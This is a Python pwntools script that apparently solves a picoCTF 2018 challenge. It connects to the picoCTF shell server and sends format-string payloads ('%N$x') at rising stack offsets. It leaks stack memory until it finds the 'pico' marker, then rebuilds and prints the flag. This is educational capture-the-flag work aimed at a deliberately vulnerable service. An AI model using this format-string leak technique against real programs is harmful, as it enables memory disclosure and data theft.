from pwn import *
from codecs import encode, decode
from colorama import Fore, Style
import colorama

colorama.init()
port = int(input("picoCTF port: "))

r = remote("2018shell.picoctf.com", port)

print(f"{Fore.YELLOW}{Style.BRIGHT}\nLooking for flag buffer...\n")

pico = encode(hex(u32("pico"))[2:], "ascii")
flag = b""
read_flag_buffer = False
i = 1
while True:
	payload = b"%" + b"%d$x" %(i)
	r.sendlineafter("> ", payload)
	line = r.recvline()[:-1]
	if pico in line:
		read_flag_buffer = True
		print(f"{Style.RESET_ALL}FLAG BUFFER:")

	if read_flag_buffer:
		if len(flag) == 64:
			break
		flag += p32(int(line, 16))
		print(f"{Fore.BLUE}{Style.BRIGHT}%s" %(flag))
	i += 1
print()
flag = decode(flag.split(b"}")[0], "ascii") + "}"
print(f"{Style.RESET_ALL}FLAG: {Fore.GREEN}{Style.BRIGHT}", flag)
